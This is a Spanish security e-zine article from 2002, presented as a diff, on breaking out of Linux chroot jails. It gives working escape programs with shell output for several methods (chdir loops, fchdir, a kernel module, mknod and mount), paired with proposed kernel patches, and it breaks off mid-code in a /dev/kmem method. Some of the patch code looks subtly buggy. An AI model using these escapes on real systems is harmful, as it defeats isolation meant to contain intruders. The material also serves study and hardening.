@@ -1,0 +1,1685 @@
+|-----------------------------------------------------------------------------|
+  [ 7a69#14 ]                                                  [ 21-10-2002 ]
+ \                                                                           /
+  \-------------------------------------------------------------------------/
+   { 11 - Chroot como entorno inseguro.                            }{ Ripe }
+   |-----------------------------------------------------------------------|
+
+
+
+0.- Indice.
+-----------
+
+		1.- Introduccion.
+		2.- Rompiendo el chroot en linux (metodo 1).
+			2.1.- Solucionando el problema.
+		3.- Rompiendo el chroot en linux (metodo 2).
+			3.1.- Solucionando el problema.
+		4.- Rompiendo el chroot en linux (metodo 3).
+			4.1.- Solucionando el problema.
+		5.- Rompiendo el chroot en linux (metodos 4 y 5).
+			5.1.- Solucionando el problema.
+		6.- Rompiendo el chroot en linux (metodo 6).
+			6.1.- Solucionando el problema.
+		7.- Matizacion final.
+		8.- Conclusiones.
+
+
+		
+
+
+
+1.- Introduccion.
+-----------------
+
+     A dia de hoy nadie duda de la importancia de la seguridad informatica, 
+sin embargo siguen apareciendo cada dia numerosas vulnerabilidades (basta con
+estar suscrito a listas como bugtraq para ver que esta afirmacion es cierta),
+ello es debido a que escribir aplicaciones seguras no es nada facil, por lo
+que al montar un sistema debemos presuponer que cada una de las aplicaciones
+instaladas ahi pueden ser vulnerables. Una clásica solucion para reducir el
+impacto ante una posible explotacion es el chroot, cuya accion es 'enjaular'
+un proceso en un directorio de manera que, en principio, al proceso le sea
+imposible acceder a ninguno de los ficheros que se encuentran fuera de la
+'jaula'.
+
+     Lo que en este articulo vamos a contar va a demostrar que dicha 'jaula'
+puede, en ocasiones, tener los barrotes demasiado separados, dejando pasar
+entre ellos al mas escurridizo intruso. Para una completa comprension 
+seria recomendable la lectura de las paginas man relacionadas con chroot 
+antes de seguir (man 2 chroot y man 8 chroot).
+
+     Si bien chroot no forma parte de POSIX.1, hace ya tiempo que ha sido
+adoptada por la mayoria de los UNIX (sera dificil que encuentres alguno que
+no disponga de chroot), y suele implementarse como una llamada al sistema, 
+por lo que para analizar una posible vulnerabilidad deberemos ojear las 
+fuentes de algun kernel. Personalmente he elegido linux (concretamente la
+version 2.2.18), por ser dicho kernel el que mas conozco.
+
+
+
+
+2.- Rompiendo el chroot en linux (metodo 1).
+--------------------------------------------
+
+     Linux mantiene para cada proceso que corre en el sistema una estructura
+task_struct que contiene toda la informacion referente al proceso. Entre dicha
+informacion se encuentra una estructura fs_struct, cuya informacion hace 
+referencia el filesystem del proceso. En nuestro caso la unica informacion de
+dicha estructura que nos interesa es root y pwd, que no son mas que estructuras
+dentry que hacen referencia al directorio raiz y al directorio actual del 
+proceso respectivamente. 
+
+
+---/ include/linux/sched.h /---
+
+(...)
+
+struct task_struct {
+
+(...)
+
+/* filesystem information */
+struct fs_struct *fs;
+
+(...)
+
+};
+
+(...)
+
+struct fs_struct {
+        atomic_t count;
+        int umask;
+        struct dentry * root, * pwd;
+};
+
+(...)
+
+---/ include/linux/sched.h /---
+				
+
+     Como otras tantas cosas, esta informacion puede tambien extraerse del 
+procfs, concretamente de /proc/<PID>/root y /proc/<PID>/cwd, que se presentan
+como enlaces simbolicos al directorio correspondiente.
+
+     Para modificar el valor de dichos campos el kernel proporciona 2 syscalls,
+chroot y chdir, el codigo de las cuales puede leerse en fs/open.c y que ademas
+es muy similar (las unicas diferencias son que chroot modifica el valor de
+current->fs->root, y que solo puede ser llamada por un usuario con uid 0, y que
+chroot modifica current->fs->pwd y puede ser llamada por cualquier proceso).
+Ambas usan la funcion __namei() para extraer el dentry del path pasado a la 
+syscall, dicha funcion usara ademas lookup_dentry() para resolver el path a su
+dentry correspondiente.
+
+
+---/ fs/namei.c /---
+
+(...)
+
+struct dentry * __namei(const char *pathname, unsigned int lookup_flags)
+{
+        char *name;
+        struct dentry *dentry;
+
+        name = getname(pathname);
+        dentry = (struct dentry *) name;
+        if (!IS_ERR(name)) {
+                dentry = lookup_dentry(name, NULL, lookup_flags);
+                putname(name);
+                if (!IS_ERR(dentry)) {
+                        if (!dentry->d_inode) {
+                                dput(dentry);
+                                dentry = ERR_PTR(-ENOENT);
+	                }
+	        }
+        }
+        return dentry;
+}
+
+(...)
+
+---/ fs/namei.c /---
+
+
+     La funcion lookup_dentry() inciara la resolucion desde un dentry base, que 
+inicializara como current->fs->root si el path empieza por "/" o como
+current->fs->pwd en caso contrario, obviamente esto es lo que hace que podamos
+hacer referencia a paths absolutos y relativos. Seguidamente, se entra en un
+bucle que va recorriendo los directorios atraves del path y resolviendo cada
+uno de los dentrys hasta llegar al final. Sera entonces cuando retorne la
+estructura dentry que debera retornar namei() (para que luego sys_chroot o
+sys_chdir la signen a current->fs->root o current->fs->pwd respectivamente).
+
+     Segun lo que hemos explicado hasta ahora nada nos impediria acceder a
+directorios que se encuentren fuera de la 'jaula', podriamos incluso hacer un
+simple chroot(".."), pero no, no es asi, pues para la resolucion de los 
+nombres reservados (como son "." y "..") se usa la funcion reserved_lookup(),
+que, como vereis, en el caso de tener que resolver "..", comprueba que
+partent, que es la entrada resuelta anteriormente no sea igual a 
+current->fs->root, de manera que se hace imposible bajar del chroot usando 
+"..".
+
+
+---/ fs/namei.c /---
+
+(...)
+
+static struct dentry * reserved_lookup(struct dentry * parent, struct qstr * name)
+{
+        struct dentry *result = NULL;
+        if (name->name[0] == '.') {
+                switch (name->len) {
+                default:
+                        break;
+                case 2:
+                        if (name->name[1] != '.')
+                                break;
+
+                        if (parent != current->fs->root)
+ 				parent = parent->d_covers->d_parent;
+	                /* fallthrough */
+	        case 1:
+	                result = parent;
+                }
+        }
+        return dget(result);
+}
+
+(...)
+
+---/ fs/namei.c /---
+
+
+     De todo ello deducimos que realmente escapara del chroot es muy facil, nos
+basta con hacer lo siguiente, para lo que debemos tener privilegios de root,
+pues como ya dijimos, la syscall chroot solo puede ser llamada por un usuario
+con uid 0.
+
+	mkdir("foo", 0777);
+	chroot("foo");
+	for(i=0 ; i<1024 ; i++) chdir("..");
+	chroot(".");
+
+     Analicemos ahora con un mas de detenimiento estas lineas, y entendamos de 
+forma clara el porque de las cosas, que para eso estamos aqui.
+
+     Tenemos nuestro proceso corriendo, en el que current->fs->root y 
+current->fs-pwd estan asociados al dentry de "/home/chrooted". Seria la 
+obtención de un clasico "chroot /home/chrooted <programa>" en la linea de
+comandos. Tras hacer...
+
+	mkdir("foo", 077);
+	chroot("foo");
+
+     Tras estas lineas, el valor de current->fs->root ha tomado el siguiente
+valor; "/home/chrooted/foo", mientras que current->fs->pwd mantiene su 
+anterior valor.
+
+	for(i=0 ; i<1024 ; i++) chdir("..");
+
+     Ahora le estamos diciendo al kernel que haga 1024 reserved_lookups()'s y
+debido a que current->fs->pwd se encuentra por debajo de current->fs->root en
+el arbol de directorios, y el chdir hace referencia a un path relativo (por lo
+que tomaremos como base en __namei() a current->fs->pwd), siempre se cumplira 
+la siguiente condicion que podemos encontrar en reserved_lookup:
+
+                        if (parent != current->fs->root)
+                                parent = parent->d_covers->d_parent;
+
+     Esto quiere decir que current->fs->pwd ira bajando una y otra vez (hasta 
+1024 veces si es necesario), por lo que practicamente con seguridad llegara un
+momento en que current->fs->pwd este asociado al dentry de la raiz del
+filesystem, en ese momento hacemos lo siguiente, y hacemos que 
+current->fs->root tome el valor de current->fs->pwd, que era la raiz del 
+filesystem, por lo que ya hemos roto el chroot.
+
+     Todo lo que hemos visto hasta ahora es teoria, y a mi siempre me ha 
+gustado darle un enfoque practico a las cosas, pues es, en el fondo, la manera
+mas comoda y facil de ver las cosas. Asi que vamos a montarnos un chroot y 
+vamos a tratar de romperlo.
+
+
+---/ break_chroot.c /---
+
+#include <stdio.h>
+#include <unistd.h>
+
+int main() {
+	char *exec_argv[2];
+	int i;
+	exec_argv[0]="sh";
+	exec_argv[1]=NULL;
+	mkdir("foo", 0777);
+	chroot("foo");
+	for(i=0 ; i<1024 ; i++) chdir("..");
+	chroot(".");
+	execve("/bin/sh", exec_argv, NULL);
+}
+
+---/ break_chroot.c /---
+
+
+     Go!
+
+
+	barracuda /#
+	barracuda /# mkdir chrooted ; cd chrooted ; mkdir bin ; mkdir lib
+	barracuda /chrooted# cp /bin/bash bin
+	barracuda /chrooted# ldd /bin/bash
+	        libncurses.so.5 => /lib/libncurses.so.5 (0x40018000)
+	        libdl.so.2 => /lib/libdl.so.2 (0x40058000)
+	        libc.so.6 => /lib/libc.so.6 (0x4005c000)
+	        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+	barracuda /chrooted# cp /lib/libncurses.so.5 lib
+	barracuda /chrooted# cp /lib/libdl.so.2 lib
+	barracuda /chrooted# cp /lib/libc.so.6 lib
+	barracuda /chrooted# cp /lib/ld-linux.so.2 lib
+	barracuda /chrooted# cat >break_chroot.c<<_EOF_
+	#include <stdio.h>
+	#include <unistd.h>
+
+	int main() {
+	        char *exec_argv[2];
+	        int i;
+	        exec_argv[0]="sh";
+	        exec_argv[1]=NULL;
+	        mkdir("foo", 0777);
+	        chroot("foo");
+	        for(i=0 ; i<1024 ; i++) chdir("..");
+	        chroot(".");
+	        execve("/bin/sh", exec_argv, NULL);
+	}
+	_EOF_
+	barracuda /chrooted# gcc break_chroot.c -static -o break_chroot
+	barracuda /chrooted# chroot /chrooted bash
+	barracuda /# 
+
+
+     Ahora mismo tenemos un bash corriendo chrooteado en /chrooted. El comando
+chroot de linux se ha encargado de cambiar current->fs->root y current->fs->pwd
+para 'enjaular' el proceso. Nosotros hemos dejado un binario dentro, compilado
+como -static para que no dependa de librerias externas, que deberia romper el
+chroot segun nuestra teoria.
+
+
+	barracuda /# ./break_chroot
+	sh-2.03# ls
+	bin   cdrom     dev  floppy  initrd  lost+found  proc  sbin  usr  vmlinuz
+	boot  chrooted  etc  home    lib     mnt         root  tmp   var
+	sh-2.03#
+
+
+     La prueba ha sido totalmente satisfactoria, como veis nos volvemos a
+encontrar en la raiz del filesystem.
+
+
+
+
+
+	2.1.- Solucionando el problema.
+	-------------------------------
+
+     Si habeis estado atentos, os habreis dado cuenta que, a resumidas cuentas,
+el problema reside en la posibilidad de que current->fs->pwd este fuera 
+current->fs->root, asi que deberiamos buscar una solucion para que esto no
+suceda. Posiblemente a muchos de vosotros os ronde por la cabeza la misma
+solucion; hacer que chroot modifique current->fs->root y current->fs->pwd, asi
+seria imposible que se diera la condicion especificada antes. Vamos ahora a
+modificar las fuentes del kernel para que eso suceda, modificaremos sys_chroot
+por el siguiente codigo.
+
+NOTA: En un principio modifique current->fs->pwd desde la propia syscall
+      chroot haciendo un simple "current->fs->pwd = current->fs->root;", 
+      al tratar de romper el chroot varias veces seguidas se producia un error 
+      de segmento, por lo que opte por llamar a sys_chdir("/") dentro del
+      chroot.
+
+
+---/ fs/open.c /---
+
+(...)
+
+asmlinkage int sys_chroot(const char * filename)
+{
+        int error;
+	__u32 old_limit;
+        struct inode *inode;
+        struct dentry *dentry, *tmp;
+
+        lock_kernel();
+
+        dentry = namei(filename);
+        error = PTR_ERR(dentry);
+        if (IS_ERR(dentry))
+                goto out;
+
+        inode = dentry->d_inode;
+
+        error = -ENOTDIR;
+        if (!S_ISDIR(inode->i_mode))
+                goto dput_and_out;
+
+        error = permission(inode,MAY_EXEC);
+        if (error)
+                goto dput_and_out;
+
+        error = -EPERM;
+        if (!capable(CAP_SYS_CHROOT))
+                goto dput_and_out;
+
+        /* exchange dentries */
+        tmp = current->fs->root;
+        current->fs->root = dentry;
+
+        /* Posible solucion al problema */
+	old_limit=current->addr_limit.seg;
+	current->addr_limit.seg=0xffffffff;
+	sys_chdir("/");
+	current->addr_limit.seg=old_limit; 
+
+        dentry = tmp;
+        error = 0;
+
+dput_and_out:
+        dput(dentry);
+out:
+        unlock_kernel();
+        return error;
+}
+
+(...)
+
+---/ fs/open.c /---
+
+
+     Como veis estamos cambiando el funcionamiento de la syscall, por lo que
+muchos podriais pensar que esto puede dar problemas. Pero si tenemos en cuenta 
+que el chroot siempre va acompañado de un chdir vemos que no habra problema
+alguno ni siquiera en la llamada a chdir.
+
+     Analicemos de nuevo, pero con el nuevo kernel funcionando lo que nuestro 
+codigo rompe chroots haria ahora, asi comprobaremos que ya no es capaz de
+'desenjaularse' (por lo menos usando el metodo que hemos visto).
+
+     Tenemos nuevamente nuestro estimado proceso chrooteado en 
+"/home/chrooted". Tras ejecutar las dos primeras instrucciones, el chroot
+modifica tanto current->fs->root como current->fs->pwd, por lo que pwd no
+quedara fuera del arbol que cuelga de current->fs->root. Consecuencia de 
+ello es que al resolver el ".." del chdir no se cumple la condicion que
+compara parent con current->fs->root (parent != current->fs->root), por lo que
+current->fs->pwd seguira valiendo lo mismo que current->fs->root, y todo ello 
+evitara que el chroot se rompa. Veamos si realmente sucede eso a la practica.
+
+
+	barracuda /chrooted# chroot /chrooted bash
+	barracuda /# ./chroot_break
+	barracuda /# ls
+	bash: ls: command not found
+	barracuda /#
+
+
+
+
+
+3.- Rompiendo el chroot en linux (metodo 2).
+--------------------------------------------
+
+     En el metodo uno (presentado en el punto 2) nos nos aprovechabamos del 
+echo de que sys_chroot permite que current->fs->pwd este fuera del arbol que
+cuelga de current->fs->root, pero son la solucion del punto 3 esto ya no 
+sucede. Sin embargo pueden encontrarse metodos alternativos para que siga
+sucediendo. Si miramos nos miramos la pagina man de fchdir() leemos; "fchdir 
+is identical to chdir, only that the directory is given as an open file
+decriptor". Teniendo en cuenta que tras realizarse un chroot seguimos teniendo
+los decriptores de fichero que ya teniamos abiertos podemos tener un decriptor
+de fichero que corresponda a un directorio que se encuentre fuera de la 
+'jaula', y usar la syscall fchdir() para modificar current->fs->pwd dejando 
+este fuera de la misma.
+
+
+---/ fs/open.c /---
+
+asmlinkage int sys_fchdir(unsigned int fd)
+{
+        struct file *file;
+        struct dentry *dentry;
+        struct inode *inode;
+        int error;
+
+        lock_kernel();
+
+        error = -EBADF;
+        file = fget(fd);
+        if (!file)
+                goto out;
+
+        error = -ENOENT;
+        if (!(dentry = file->f_dentry))
+                goto out_putf;
+        if (!(inode = dentry->d_inode))
+                goto out_putf;
+
+        error = -ENOTDIR;
+        if (!S_ISDIR(inode->i_mode))
+                goto out_putf;
+
+        error = permission(inode, MAY_EXEC);
+        if (!error) {
+                struct dentry *tmp = current->fs->pwd;
+                current->fs->pwd = dget(dentry);
+                dput(tmp);
+        }
+out_putf:
+        fput(file);
+out:
+        unlock_kernel();
+        return error;
+}
+
+---/ fs/open.c /---
+
+
+     Como podeis ver al realizar el cambio de current->fs->pwd no se realiza
+ningun tipo de comprobacion para saber si este queda fuera o dentro del 
+chroot. Por ahi podemos atacar nosotros. ¿Como?
+
+    Primero de todo abrimos el directorio actual, de manera que obtenemos un
+decriptor de fichero para tratar con el mismo. Seguidamente creamos un 
+directorio y chrooteamos a el, sufriendo el cambio tanto current->fs->root 
+como current->fs->pwd, pero manteniendo el decriptor de fichero que hemos
+abierto, lo que nos permite llamar a fchdir() modificando current->fs->pwd, de
+manera que este queda fuera del arbol y podemos hacer a partir de aqui lo mismo
+que haciamos en el punto 2.
+
+
+---/ break_chroot2.c /---
+
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main() {
+	char *exec_argv[2];
+	int i;
+	int fd;
+	exec_argv[0]="sh";
+	exec_argv[1]=NULL;
+	fd=open(".", O_RDONLY);
+	mkdir("foo", 0777);
+	chroot("foo");
+	fchdir(fd);
+	for(i=0 ; i<1024 ; i++) chdir("..");
+	chroot(".");
+	close(fd);
+	execve("/bin/sh", exec_argv, NULL);
+}
+
+---/ break_chroot2.c /---
+
+
+     Go!
+
+
+	barracuda /chrooted# cat >break_chroot2.c<<_EOF_
+        #include <stdio.h>
+        #include <unistd.h>
+	#include <fcntl.h>
+
+        int main() {
+                char *exec_argv[2];
+                int i;
+		int fd;
+                exec_argv[0]="sh";
+                exec_argv[1]=NULL;
+		fd=open(".", O_RDONLY);
+                mkdir("foo", 0777);
+                chroot("foo");
+		fchdir(fd);
+                for(i=0 ; i<1024 ; i++) chdir("..");
+                chroot(".");
+		close(fd);
+                execve("/bin/sh", exec_argv, NULL);
+        }
+	_EOF_
+	barracuda /chrooted# gcc break_chroot2.c -static -o break_chroot2
+	barracuda /chrooted# chroot /chrooted bash
+	barracuda /# ./break_chroot
+	sh-2.03# ls
+	bin   cdrom     dev  floppy  initrd  lost+found  proc  sbin  usr  vmlinuz
+	boot  chrooted  etc  home    lib     mnt         root  tmp   var
+	sh-2.03#
+
+
+     No se necesitan mas palabras... Hemos roto el chroot :)
+     
+
+
+
+
+	3.1.- Solucionando el problema.
+	-------------------------------
+
+     Esta vez el problema parece mas complicado de solucionar, y de echo lo 
+es. El problema, en este caso, es que fchdir() no comprueba que el directorio
+al que se va a cambiar este fuera del arbol que cuelga de current->fs->root.
+Asi pues, la solucion pasara por hacer que si lo haga. ¿Como podriamos 
+hacerlo?
+
+     Posiblemente a mas de uno, se le haya ocurrido recorrer todo el arbol de
+directorios, partiendo de current->fs->root buscando uno cuyo dentry coincida 
+con el dentry extraido del decriptor de fichero pasado a fchdir(), de manera 
+que podriamos asegurar que este se encuentra 'colgando' de current->fs->root,
+pero esta solucion seria demasiado costosa para el sistema operativo, asi que
+estuve pensando en una alternativa y se me ocurrio algo bastante sencillo y
+mucho menos costoso.
+
+     Sabemos que en la struct dentry, d_parent apunta al directorio padre
+exepto en en la raiz del sistema de ficheros (no confundais con la raiz del
+chroot), donde apunta a la propia estructura. Gracias a ello, podemos sacar
+el 'camino' de dentrys que tiene cualquier directorio facilmente, y mediante
+dicho 'camino' es facil ver si un dentry cuelga de otro. Ahi va mi parche.
+
+
+---/ fs/open.c /---
+
+/*
+ * Hemos añadido estas dos funciones para juguetear un poco con los dentrys :-)
+ */
+ 
+struct dentry **getdentryway(struct dentry *d) {
+        struct dentry **ret;
+        struct dentry *dc;
+        int count;
+	
+        for(count=0, dc=d ; dc->d_parent!=dc ; count++, dc=dc->d_parent);
+        
+	ret=(struct dentry **)kmalloc(count*(sizeof(struct dentry *)), GFP_KERNEL);
+        ret[count--]=NULL;
+	
+        for(dc=d ; dc->d_parent!=dc ; count--, dc=dc->d_parent) ret[count]=dc;
+        
+	return(ret);
+}
+
+
+int isdentryin(struct dentry *d1, struct dentry *d2) {
+        int i;
+        struct dentry **way_d1;
+        struct dentry **way_d2;
+	
+        way_d1=getdentryway(d1);
+        way_d2=getdentryway(d2);
+	
+        for(i=0 ; i<1024 ; i++) {
+                if (way_d1[i]==0) return(1);
+                if (way_d1[i]!=way_d2[i]) return(0);
+        }
+	
+        kfree(way_d1);
+        kfree(way_d2);
+	
+        return(0);
+}
+
+asmlinkage int sys_fchdir(unsigned int fd)
+{
+        struct file *file;
+        struct dentry *dentry;
+        struct inode *inode;
+        int error;
+
+        lock_kernel();
+
+        error = -EBADF;
+        file = fget(fd);
+        if (!file)
+                goto out;
+
+        error = -ENOENT;
+        if (!(dentry = file->f_dentry))
+                goto out_putf;
+        if (!(inode = dentry->d_inode))
+                goto out_putf;
+
+        error = -ENOTDIR;
+        if (!S_ISDIR(inode->i_mode))
+                goto out_putf;
+
+        error = permission(inode, MAY_EXEC);
+
+	/*
+	 * Aqui hemos metido mano...
+	 * ¿Estamos intentando acceder fuera del chroot?
+	 */
+        if (!isdentryin(current->fs->root, dentry)) error=-EPERM;
+	
+        if (!error) {
+                struct dentry *tmp = current->fs->pwd;
+                current->fs->pwd = dget(dentry);
+                dput(tmp);
+        }
+out_putf:
+        fput(file);
+out:
+        unlock_kernel();
+        return error;
+}
+
+---/ fs/open.c /---
+
+
+     Como podeis ver, he añadido dos funciones al fichero, getdentryway() 
+retorna un array de punteros a dentrys que corresponden al 'camino' de un
+dentry dado, y isdentryin() mira si un dentry cuelga del arbol de otro.
+
+     Si ahora probamos de nuevo el modelo 2 del break_croot, veremos que
+este no es capaz de romper el chroot, se queda a dos velas.
+
+
+        barracuda /chrooted# chroot /chrooted bash
+        barracuda /# ./chroot_break2
+        barracuda /# ls
+        bash: ls: command not found
+        barracuda /#
+		
+
+
+
+4.- Rompiendo el chroot en linux (Metodo 3).
+--------------------------------------------
+
+     Con las 2 modificaciones que se le han hecho al kernel, parece que hemos
+evitado que un intruso pueda salir de su jaula, sin embargo eso no es asi en 
+linux que usen un kernel con soporte para Loadable Kernel Modules, puesto que 
+gracias a los LKM podemos ejecutar codigo en ring0 y en consecuencia acceder a
+toda la memoria, lo que nos permitira facilmente modificar los datos de la
+task_struct de un proceso.
+
+     Hacer esto, como ya dije, es muy sencillo. Basta con extraer la 
+task_struct adecuada y modificar los campos adecuados, que en este caso son los
+mismos de los que hemos venido hablando durante todo el articulo.
+
+
+---/ break_chroot3.c /---
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/sched.h>
+#include <linux/file.h>
+#include <linux/smp_lock.h>
+
+int break_chroot(struct task_struct *p) {
+        struct dentry *root;
+        struct dentry *tmp;
+
+        lock_kernel();
+
+        for (root=current->fs->root ; root->d_parent!=root ; root=root->d_parent);
+
+        tmp=p->fs->root;
+        p->fs->root=root;
+        dput(tmp);
+
+        tmp=p->fs->pwd;
+        p->fs->pwd=root;
+        dput(tmp);
+
+        unlock_kernel();
+
+        return(0);
+}
+
+int init_module() {
+        break_chroot(current->p_pptr);
+        return(-1);     /* No keremos dejar nada en memoria */
+}
+
+void cleanup_module() {
+}
+
+---/ break_chroot3.c /---
+
+     
+     Obviamente para que esto funcione debemos poder insertar el modulo. para
+ello nos basta con tener acceso a las syscalls create_module e init_module y 
+programarnos un loader. Por suerte alguien lo hizo ya antes que nosotros, por
+lo que podemos disponer de "insmod". Lo que haremos en este caso para poder 
+usar insmod dentro del entorno chroot sera lo mismo que hicimos con el bash.
+
+     Una vez hecho, comprobaremos que nuestro modulo funciona perfectamente 
+(no os alarmeis por el mensaje de error, es normal, pues nuestra funcion
+init_module retorna -1 para no dejar nada en memoria).
+
+
+	barracuda /chrooted# gcc -O3 -c -I/usr/src/linux/include break_chroot3.c
+	barracuda /chrooted# chroot /chrooted bash
+	barracuda /# insmod break_chroot3.o
+	break_chroot3.o: init_module: Device or resource busy
+	Hint: insmod errors can be caused by incorrect module parameters, including invalid IO or IRQ parameters
+	barracuda /# ls
+	bin   cdrom     dev  floppy  initrd  lost+found  proc  sbin  usr  vmlinuz
+	boot  chrooted  etc  home    lib     mnt         root  tmp   var
+	barracuda /#
+
+    
+    Y una vez mas... sobran las palabras.
+
+
+
+
+     4.1.-Solucionando el problema.
+     ------------------------------
+
+      Normalmente no se instalara ningun modulo de kernel en un entorno 
+chrootrado, por lo que la solucion a este problema es realmente sencilla. Nos
+bastara con prohibir la insercion de modulos desde un entorno chrooteado. 
+
+      Para hacer esto debemos recordar que en la carga de un modulo se usan
+las syscalls create_module e init_module. Lo unico que tendremos que hacer es
+que create_module retorne error si trata de ser llamada desde un entorno 
+chrooteado.
+
+---/ kernel/module.c /---
+
+asmlinkage unsigned long
+sys_create_module(const char *name_user, size_t size)
+{
+        char *name;
+        long namelen, error;
+        struct module *mod;
+        struct dentry *root;
+
+        lock_kernel();
+        if (!capable(CAP_SYS_MODULE)) {
+                error = -EPERM;
+                goto err0;
+        }
+
+	/* 
+	 * Sacamos el dentry del directorio raiz bajando hasta el limite
+	 * usando el campo d_parent que ya hemos visto en varias ocasiones.
+	 */
+        for(root=current->fs->root ; root->d_parent!=root ; root=root->d_parent);
+
+	/*
+	 * Si no coincide con la raiz del proceso es que estamos en un entorno
+	 * chrooteado, por lo que prohibimos la carga del modulo.
+	 */
+        if (root!=current->fs->root) {
+                error = -EPERM;
+                goto err0;
+        }
+
+        if ((namelen = get_mod_name(name_user, &name)) < 0) {
+                error = namelen;
+                goto err0;
+        }
+        if (size < sizeof(struct module)+namelen) {
+                error = -EINVAL;
+                goto err1;
+        }
+        if (find_module(name) != NULL) {
+                error = -EEXIST;
+                goto err1;
+        }
+        if ((mod = (struct module *)module_map(size)) == NULL) {
+                error = -ENOMEM;
+                goto err1;
+        }
+
+        memset(mod, 0, sizeof(*mod));
+        mod->size_of_struct = sizeof(*mod);
+        mod->next = module_list;
+        mod->name = (char *)(mod + 1);
+        mod->size = size;
+        memcpy((char*)(mod+1), name, namelen+1);
+
+        put_mod_name(name);
+
+        module_list = mod;      /* link it in */
+
+        error = (long) mod;
+        goto err0;
+err1:
+        put_mod_name(name);
+err0:
+        unlock_kernel();
+        return error;
+}
+
+
+---/ kernel/module.c /---
+
+
+    Si intentamos cargar de nuevo el modulo rompe chroots dentro del entorno
+chrooteado leeremos un mensaje de error similar a este:
+
+
+	barracuda /# insmod break_chroot3.o
+	break_chroot3.o: create_module: Operation not permitted
+	barracuda /#
+
+
+
+
+5.- Rompiendo el chroot en linux (Metodos 4 y 5).
+-------------------------------------------------
+
+    En el kernel de linux hay, podriamos decir 3 niveles en el acceso a un
+fichero, el dispositivo, el sistema de ficheros y el propio fichero. De manera
+que cuando se accede a un fichero se consulta al filesystem y este consulta
+al dispositivo. Como bien sabeis, linux proporciona acceso a los dispositivos
+de la misma forma que los fichero, creado esto con la syscall mknod, y 
+teniendo cada dispositivo un major number asociado.
+
+    Incluso desde dentro de un entorno chrooteado podemos ser capaces de 
+llamar a la syscall mknod, lo que nos brinda la posibilidad de crear
+dispositivos mediante los cuales podemos acceder a informacion privilegiada y
+util. Todo esto nos ofrece varias posibilidades.
+
+    Podemos crear device perteneciente al dispositivo de almacenamiento (el
+disco duro) y acceder a el directamente, al mas puro estilo RAW. Este tipo de
+acceso es realmente incomodo, y deberiamos implementar todo el sistema de
+acceso a ficheros (que ademas depende de los filesystem que se esten usando).
+Por suerte el kernel hizo esa implementacion por nosotros, y ademas, nos la 
+deja usar. Podemos llamar a la syscall mount() para montar el dispositivo que
+hemos creado, y acto seguido chrootear al punto de montaje. Pese a que esta
+tecnica es muy sencilla, se requiere cierta informacion de la maquina para
+poder realizar mount con satisfaccion. Necesitamos saber que devices se estan
+usando (el major y minor number) y el sistema de ficheros que se esta usando.
+
+---/ break_chroot4.c /---
+
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/mount.h>
+#include <errno.h>
+
+#define DEVNAME         "foo"
+#define DIRNAME         "bar"
+
+#define MAJOR		3
+#define MINOR		2
+#define FILESYSTEM	"ext2"
+
+int main() {
+        char *exec_argv[2];
+        exec_argv[0]="sh";
+        exec_argv[1]=NULL;
+        mkdir(DIRNAME, 0777);
+        mknod(DEVNAME, S_IFBLK|0600, makedev(MAJOR, MINOR));
+        mount(DEVNAME, DIRNAME, FILESYSTEM, 0xc0ed0000, NULL);
+        chroot(DIRNAME);
+        chdir("/");
+        execve("/bin/sh", exec_argv, NULL);
+}
+
+
+---/ break_chroot4.c /---
+
+    
+    En este ejemplo he usado como major y minor number 3 y 2 respectivamente,
+que corresponden al dispositivo /dev/hda2, que es en el que tengo la raiz del
+sistema, el sistema de ficheros usado es ext2, y debido a que esta tecnica no
+funciona sobre kernels 2.2.x he realizado la prueba que viene a continuacion 
+en un kernel 2.4.17.
+
+
+	barracuda /chrooted# gcc -static break_chroot4.c -o break_chroot4
+	barracuda /chrooted# chroot /chrooted bash
+	barracuda /# ./break_chroot4
+	barracuda /# ls
+        bin   cdrom     dev  floppy  initrd  lost+found  proc  sbin  usr  vmlinuz
+	boot  chrooted  etc  home    lib     mnt         root  tmp   var
+	barracuda /#
+
+
+    Pero esto no es todo. El hecho de poder disponer de los dispositivos nos
+brinda aun mas posibilidades. Podemos crear un dispositivo con major number 1 
+y minor number 2 (lo que seria un simil de /dev/kmem), y usarlo para 
+toquetear la memoria del kernel y cambiar los datos de la task_struct del 
+proceso chrooteado, de forma similar a la que hicimos con el modulo de kernel.
+
+    Usaremos dos funciones kread y kwrite para leer/tocar la memoria del kernel 
+via /dev/kmem, creado previamente con mknod. Romperemos el chroot con este 
+codigo:
+
+
+---/ break_chroot5.c /---
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+#include <linux/sched.h>
+#include <linux/file.h>
+#include <unistd.h>
+
+#define makedev(major, minor) ((((uint) major & 0xFF) << 8) | ((uint) minor & 0xFF))
+
+#define DEVNAME         "foo"
+
+unsigned long get_ksym_pos(char *name) {
+        int i;
+        int ret;
+        struct module_symbol *ms;
+        query_module(0, QM_SYMBOLS, 0, 0, &ret);
+        ms=(struct module_symbol *)malloc(ret);
+        query_module(NULL, QM_SYMBOLS, ms, ret, &ret);
+        for(i=0 ; i<ret ; i++) {
+                ms[i].name+=(unsigned long)ms;
+                if (!strncmp(ms[i].name, name, strlen(name))) break;
+        }
+        free(ms);
+        return(ms[i].value);
+}
+
+int kread(unsigned long pos, char *buf, int len) {
+        int fd;
+        int ret;
+        fd=open(DEVNAME, O_RDONLY);
+        lseek(fd, pos, SEEK_SET);
+        ret=read(fd, buf, len);
+        close(fd);
+        return(ret);
+}
+
+int kwrite(unsigned long pos, char *buf, int len) {
+        int fd;
+        int ret;
+        fd=open(DEVNAME, O_WRONLY);
+        lseek(fd, pos, SEEK_SET);
+        ret=write(fd, buf, len);
+        close(fd);
+        return(ret);
+}
+
+struct task_struct *find_task_struct_by_pid(int pid) {
+        unsigned long task_init=get_ksym_pos("init_task_union");
+        unsigned long kpos;
+        struct task_struct *task=(struct task_struct *)malloc(sizeof(struct task_struct));
+        kread(task_init, (char *)task, sizeof(struct task_struct));
+        do {
+                kpos=(unsigned long)task->next_task;
+                kread(kpos, (char *)task, sizeof(struct task_struct));
+        } while(task->pid && task->pid!=pid);
+        return(task);
+}
+
+void break_chroot(struct task_struct *task) {
+        struct fs_struct fs;
+        struct fs_struct wr;
+        struct dentry dentry;
+        unsigned long kpos;
+        unsigned long wr_kpos;
